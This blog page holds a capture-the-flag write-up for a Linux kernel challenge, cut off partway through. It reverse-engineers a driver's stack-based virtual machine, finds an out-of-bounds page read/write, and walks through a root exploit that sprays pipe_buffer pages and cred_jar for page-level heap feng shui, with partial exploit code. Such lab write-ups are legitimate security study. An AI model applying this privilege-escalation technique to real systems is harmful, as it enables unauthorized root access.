<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Fâtih&#39;in İstanbul&#39;u fethettiği yaştasın!">
<meta property="og:type" content="website">
<meta property="og:title" content="Blog de Назриндак">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Blog de Назриндак">
<meta property="og:description" content="Fâtih&#39;in İstanbul&#39;u fethettiği yaştasın!">
<meta property="og:locale">
<meta property="article:author" content="NazrinDuck">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>Blog de Назриндак</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Blog de Назриндак</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">二进制安全爱好者</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/26/2025jqctf-mem/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/26/2025jqctf-mem/" class="post-title-link" itemprop="url">[京麒CTF 2025] mem writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-05-26 00:08:05 / Modified: 20:39:55" itemprop="dateCreated datePublished" datetime="2025-05-26T00:08:05+08:00">2025-05-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>第一个在赛时做出来的Kernel Pwn，太不容易了</p>
</blockquote>
<h2 id="防护检查"><a href="#防护检查" class="headerlink" title="防护检查"></a>防护检查</h2><h3 id="杂项检查"><a href="#杂项检查" class="headerlink" title="杂项检查"></a>杂项检查</h3><p><code>./run.sh</code>脚本中启用了smap,smep,kaslr防护，此外没什么特殊的<br>文件系统经检验没有权限漏洞<br>给了Kconfig，内核版本为<strong>Linux v6.6.91</strong>，较高版本，赛时没有详细检查Kconfig中的条目</p>
<h3 id="Kconfig检查"><a href="#Kconfig检查" class="headerlink" title="Kconfig检查"></a>Kconfig检查</h3><p>Kconfig中的<code>CONFIG_USER_NS</code>没有打开，意味着我们无法开辟自己的命名空间，也就无法使用<code>pgv</code>堆喷</p>
<p>slab相关的防护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># SLAB allocator options</span><br><span class="line">#</span><br><span class="line"># CONFIG_SLAB_DEPRECATED is not set</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line"># CONFIG_SLUB_TINY is not set</span><br><span class="line">CONFIG_SLAB_MERGE_DEFAULT=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line"># CONFIG_SLUB_STATS is not set</span><br><span class="line">CONFIG_SLUB_CPU_PARTIAL=y</span><br><span class="line">CONFIG_RANDOM_KMALLOC_CACHES=y</span><br><span class="line"># end of SLAB allocator options</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意<code>CONFIG_RANDOM_KMALLOC_CACHES=y</code>这个选项，之后会体现其作用</p>
</blockquote>
<p>在slab分配器的防护基本都打开了，意味着我们很难进行利用slab</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>IDA反编译发现程序很复杂，尤其是<code>memem_ioctl</code>函数，第一眼还以为被ollvm混淆了</p>
<p>初始化函数创建了一个名为<code>/dev/mememe</code>的设备，并提供了<code>open</code>, <code>read</code>, <code>write</code>和<code>ioctl</code>等功能</p>
<p>先分析<code>mememe_open</code>函数，发现程序调用了两个<code>kmalloc</code>，一个<code>alloc_page</code><br>前两个<code>kmalloc</code>貌似被随机化了，无法静态分析其使用的是哪一个slab，后一个<code>alloc_page</code>申请的是order-0的page,并转成虚拟地址赋值给了一个地址偏移量。</p>
<blockquote>
<p>事实上，这种缓解策略叫<strong>Random kmalloc caches</strong>，是前文<code>CONFIG_RANDOM_KMALLOC_CACHES=y</code>选项提供的<br>它的作用大概是为每个大小引入了多个通用 slab 缓存，在调用时通过返回地址（<code>ret_addr</code>）和随机数（<code>random_kmalloc_seed</code>）伪随机选择其中一个使用<br>效果如下所示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/slabinfo</span></span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line">...</span><br><span class="line">kmalloc-rnd-15-8k 0 0 8192 4 8 : tunables 0 0 0 : slabdata 0 0 0</span><br><span class="line">kmalloc-rnd-15-4k 8 8 4096 8 8 : tunables 0 0 0 : slabdata 1 1 0</span><br><span class="line">kmalloc-rnd-15-2k 32 32 2048 8 4 : tunables 0 0 0 : slabdata 4 4 0</span><br><span class="line">kmalloc-rnd-15-1k 32 32 1024 8 2 : tunables 0 0 0 : slabdata 4 4 0</span><br><span class="line">kmalloc-rnd-15-512 48 48 512 8 1 : tunables 0 0 0 : slabdata 6 6 0</span><br><span class="line">kmalloc-rnd-15-256 80 80 256 16 1 : tunables 0 0 0 : slabdata 5 5 0</span><br><span class="line">kmalloc-rnd-15-192 42 42 192 21 1 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">kmalloc-rnd-15-128 64 64 128 32 1 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">kmalloc-rnd-15-96 42 42 96 42 1 : tunables 0 0 0 : slabdata 1 1 0</span><br><span class="line">kmalloc-rnd-15-64 128 128 64 64 1 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">kmalloc-rnd-15-32 128 128 32 128 1 : tunables 0 0 0 : slabdata 1 1 0</span><br><span class="line">kmalloc-rnd-15-16 512 512 16 256 1 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">kmalloc-rnd-15-8 1024 1024 8 512 1 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">kmalloc-rnd-14-8k 4 4 8192 4 8 : tunables 0 0 0 : slabdata 1 1 0</span><br><span class="line">kmalloc-rnd-14-4k 8 8 4096 8 8 : tunables 0 0 0 : slabdata 1 1 0</span><br><span class="line">kmalloc-rnd-14-2k 16 16 2048 8 4 : tunables 0 0 0 : slabdata 2 2 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该缓解方法还是由<strong>华为</strong>工程师<a target="_blank" rel="noopener" href="https://lwn.net/Articles/938246/">提出来的</a>，<del>华为为我增智慧了</del> <img src="/images/2025jqctf-mem/huawei.jpg" alt=":)"></p>
</blockquote>
</blockquote>
<p>仔细分析发现程序中貌似有个结构体，<code>memset</code>函数之后有很多地址赋值语句，不同的偏移地址赋值代表着不同的字段，不过目前还不清楚它们大部分的功能。</p>
<blockquote>
<p>字段名称是之后补充的</p>
</blockquote>
<figure class="highlight c"><figcaption><span>核心部分</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> mememe = (vmmem *)v2;</span><br><span class="line">    *(_QWORD *)(v2 + <span class="number">8</span>) = <span class="number">4096LL</span>;</span><br><span class="line">    v5 = alloc_pages(<span class="number">0x500CC2</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">      mememe-&gt;page = (<span class="type">void</span> *)(page_offset_base + ((v5 - vmemmap_base) &lt;&lt; <span class="number">6</span>));</span><br><span class="line">      v7 = kmalloc_trace(</span><br><span class="line">             kmalloc_caches[<span class="number">14</span> * ((<span class="number">0x61C8864680B583EB</span>LL * (random_kmalloc_seed ^ retaddr)) &gt;&gt; <span class="number">60</span>) + <span class="number">3</span>],</span><br><span class="line">             <span class="number">3264LL</span>,</span><br><span class="line">             <span class="number">4LL</span>);</span><br><span class="line">      mememe-&gt;kmap = (__int32 *)v7;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(mememe-&gt;page, <span class="number">0</span>, mememe-&gt;pagesize);</span><br><span class="line">        *mememe-&gt;kmap = <span class="number">0</span>;</span><br><span class="line">        mememe-&gt;length = <span class="number">0LL</span>;</span><br><span class="line">        mememe-&gt;var3 = <span class="number">0LL</span>;</span><br><span class="line">        mememe-&gt;rsp = <span class="number">-1</span>;</span><br><span class="line">        _mutex_init(&amp;mememe-&gt;mutex, <span class="string">&quot;&amp;priv-&gt;lock&quot;</span>, &amp;mememe_open___key);</span><br><span class="line">        *(_QWORD *)(a2 + <span class="number">200</span>) = mememe;</span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">      &#125;</span><br><span class="line">      _free_pages(v6, <span class="number">0LL</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>mememe_read</code>与<code>mememe_write</code>内容较少且个防护很严格的，简单审计<code>mememe_release</code>函数发现没有UAF，直接分析<code>mememe_ioctl</code>函数</p>
<blockquote>
<p>IDA并没有很好地处理这里的逻辑，静态分析很难受</p>
</blockquote>
<p>分析发现该函数大概以中间的<code>memset</code>函数分为两小部分，且后半部分一直在用<code>if</code>或<code>switch</code>检验某个固定的变量的值，猜想是虚拟机指令处理部分，对不同的id执行不同的函数</p>
<p>结合之前的结构体以及程序逻辑，逆向还原虚拟机结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vmmem</span> // <span class="title">sizeof</span>=</span><span class="number">0xB8</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">char</span> *page;</span><br><span class="line">     __int64 pagesize;</span><br><span class="line">     __int64 length;</span><br><span class="line">     __int32 *kmap;</span><br><span class="line">     __int64 var3;</span><br><span class="line">     __int32 <span class="built_in">stack</span>[<span class="number">32</span>];</span><br><span class="line">     __int32 rsp;</span><br><span class="line">     <span class="comment">// padding byte</span></span><br><span class="line">     <span class="comment">// padding byte</span></span><br><span class="line">     <span class="comment">// padding byte</span></span><br><span class="line">     <span class="comment">// padding byte</span></span><br><span class="line">     __int64 mutex;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>page</code>字段是<code>alloc_page</code>得到的order-0 page，里边存放的是将要分析的虚拟机指令，<code>kmap</code>字段为<code>kmalloc</code>得到的空间，存放栈顶元素，<code>stack</code>字段是虚拟机栈，<code>rsp</code>字段指向栈顶。</p>
<p>虚拟机指令结构体，各种指令操作如下所示：</p>
<blockquote>
<p>立即数直接用<code>uint32_t</code>会导致padding到8字节，或许需要显式align一下</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn</span> &#123;</span> <span class="comment">// sizeof=0x6</span></span><br><span class="line">  <span class="type">uint8_t</span> idx;</span><br><span class="line">  <span class="type">uint8_t</span> next;</span><br><span class="line">  <span class="type">uint16_t</span> imm1;</span><br><span class="line">  <span class="type">uint16_t</span> imm2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rsp &gt; 0 || rsp &lt; 30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* insn:</span></span><br><span class="line"><span class="comment"> *  00_00_0000_0000</span></span><br><span class="line"><span class="comment"> *  id_nx_imm</span></span><br><span class="line"><span class="comment"> * eg:</span></span><br><span class="line"><span class="comment"> *  11_00_FFFF_FFFF</span></span><br><span class="line"><span class="comment"> * size: 0x6</span></span><br><span class="line"><span class="comment"> * curr_insn: idx</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * id:</span></span><br><span class="line"><span class="comment"> * 0:</span></span><br><span class="line"><span class="comment"> *  nop</span></span><br><span class="line"><span class="comment"> * 4:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] + stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 5:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] - stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 6:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] * stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 7:</span></span><br><span class="line"><span class="comment"> *  if stack[rsp] == 0 &#123;</span></span><br><span class="line"><span class="comment"> *    stack[rsp] = 0</span></span><br><span class="line"><span class="comment"> *    rsp will not change</span></span><br><span class="line"><span class="comment"> *  &#125; else &#123;</span></span><br><span class="line"><span class="comment"> *    stack[rsp - 1] = stack[rsp - 1] / stack[rsp]</span></span><br><span class="line"><span class="comment"> *    rsp--</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * 8:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] ^ stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 10:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = imm</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 11:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = page[imm]</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 12:</span></span><br><span class="line"><span class="comment"> *  page[imm] = stack[rsp] // ??? AAW</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 13:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 14:</span></span><br><span class="line"><span class="comment"> *  xchg stack[rsp], stack[rsp-1]</span></span><br><span class="line"><span class="comment"> * 15:</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 16:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &lt;&lt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 17:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &gt;&gt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 18:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &amp; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 19:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] | stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 20:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] == stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 21:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] != stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 22:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &lt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 23:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &gt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NEXT:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  v14 = (idx + 2) + page[v14] + 1</span></span><br><span class="line"><span class="comment"> *  idx = (idx + 2) + page[v14]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STOP:</span></span><br><span class="line"><span class="comment"> *  kmap = stack[rsp]</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>其中<code>memset</code>函数之前的部分是检查部分，对部分指令进行了约束，防止访问越界</p>
<p>分析结束很容易发现有一个漏洞，由于指令都存在字段<code>page</code>里，我们可以利用id 12指令进行运行时修改page内原来的指令，造成page越界读和越界写原语</p>
<blockquote>
<p>这个任意读&#x2F;任意写的大小是DWORD(4字节)，不过可以以任意偏移无限触发，还是很强大的</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>有了page层面的越界读写之后就好办了，我们可以通过堆喷和页级堆风水，造成该页面与<code>cred_jar</code>页面物理相邻的局面，在直接映射区的虚拟地址也相邻，从而利用越界写改写<code>cred_jar</code>直接一步提权</p>
<blockquote>
<p>甚至不需要利用<code>mememe_read</code>功能，因为该方法<strong>无需任何地址泄漏</strong></p>
</blockquote>
<h3 id="赛时策略"><a href="#赛时策略" class="headerlink" title="赛时策略"></a>赛时策略</h3><p>事实上，在构造order-0的页级堆风水应该堆喷order-1的pages，但是赛时我<del>嫌麻烦</del>没有去尝试<code>pgv</code>堆喷，而是直接堆喷<code>pipe_buffer</code>来获得大量的order-0 pages，这种情况下时间先后获得的两个页面大概率也物理相邻，成功率还是很高的</p>
<blockquote>
<p>赛后验证发现<code>CONFIG_USER_NS</code>没有打开，无法用<code>pgv</code></p>
</blockquote>
<p>之后的操作就是先free id为奇数的<code>pipe_buffer</code>造成page hole,再打开该设备<code>/dev/mememe</code>，此时<code>mememe_open</code>函数中的<code>alloc_page</code>很大概率会取到之前free的<code>pipe_buffer</code>的page hole</p>
<p>下一步，我的策略是把剩下的<code>pipe_buffer</code>全部free掉，然后再用<code>setuid(1000)</code>堆喷<code>cred_jar</code>取走刚刚free的<code>pipe_buffer</code>的page，此时的<code>cred_jar</code>大概率会申请到<code>mememe-&gt;page</code>的相邻地址处（假设之前的步骤都成功）</p>
<p>最后在大量<code>fork</code>提权函数，并利用越界写覆写<code>cred_jar</code>提权。虽然假设了不少因素，本地成功率还是很高的</p>
<blockquote>
<p>远程成功率偏低了一点，大概5,6次才成功，但是本地试了十几次只有一次没有成功</p>
</blockquote>
<p><img src="/images/2025jqctf-mem/win.jpg" alt=":)"></p>
<h3 id="改进策略"><a href="#改进策略" class="headerlink" title="改进策略"></a>改进策略</h3><blockquote>
<p>由于无法使用<code>pgv</code>堆喷，因此将现有的pipe_buffer堆喷改进了一下</p>
</blockquote>
<p>赛时策略的做法只能是可堪一用，好多细节都没有把握好。二次free后的<code>pipe_buffer</code>造成的page hole过大，而我们的利用需要物理相邻的页面被<code>cred_jar</code>占用，只有一个页满足该条件，喷中的概率小了很多</p>
<p>因此，我们可以将没有喷中<code>pipe_buffer</code>的page再次填充，在第二轮free之前不存在多余的page hole</p>
<blockquote>
<p>做标记的目的是方便调试寻找&#x2F;判断是否命中</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    pipe_buf[<span class="number">0xa</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    pipe_buf[<span class="number">0xb</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fill page hole with new pipe_buffer\n&quot;</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>虽然<code>mememe_read</code>理论上不需要用，但是我们可以用page越界读获取被溢出的victim page的信息，从而靶向free特定的<code>pipe_buffer</code>，只在物理相邻的页中留下free page,提高成功率</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">overread</span>[] =</span> &#123;</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">14</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">11</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  info(<span class="string">&quot;prepare to overread\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *dev_recv = <span 